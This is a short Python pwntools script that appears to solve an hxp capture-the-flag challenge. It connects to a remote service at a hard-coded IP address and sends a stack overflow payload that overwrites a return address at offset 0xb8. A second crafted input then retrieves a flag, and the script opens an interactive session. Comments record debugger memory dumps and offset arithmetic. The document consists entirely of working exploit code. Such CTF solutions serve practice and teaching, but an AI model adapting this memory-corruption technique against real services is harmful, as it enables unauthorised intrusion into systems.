#!/usr/bin/env python3
from pwn import *

io = remote('78.47.126.177', 7777)
# io = remote('localhost', 7777)
io.recvuntil('First Flag:\n')
io.send(flat({
    0x00: b'\x00',
    # 0x7fff410b3bb0:	104 'h'	120 'x'	112 'p'	123 '{'	50 '2'	50 '2'	50 '2'	50 '2'
    # 0x7fff410b3bb8:	50 '2'	50 '2'	50 '2'	50 '2'	50 '2'	50 '2'	50 '2'	50 '2'
    # 0x7fff410b3bc0:	50 '2'	50 '2'	50 '2'	50 '2'	50 '2'	118 'v'	119 'w'	120 'x'
    # ...
    # 0x7fff410b3c68:	67 'C'	68 'D'	69 'E'	70 'F'	71 'G'	72 'H'	73 'I'	74 'J'
    # flag1 = 0x7fff410b3bcd - (ord('v') - ord('a')) = 0x7fff410b3bb8
    # ret_off = 0x7fff410b3c68 - 0x7fff410b3bb8 = 0xb0 (?)
    0xb8: struct.pack('<Q', 0x4007b6),
}, length=0xff, filler=string.ascii_letters.encode()))
io.recvuntil('Second Flag:\n')
io.send(flat({
    0x0b: b'hxp{',  # 0x1b is another magic offset
    0x2f: b'\n',
}, filler=b'2'))
io.interactive()
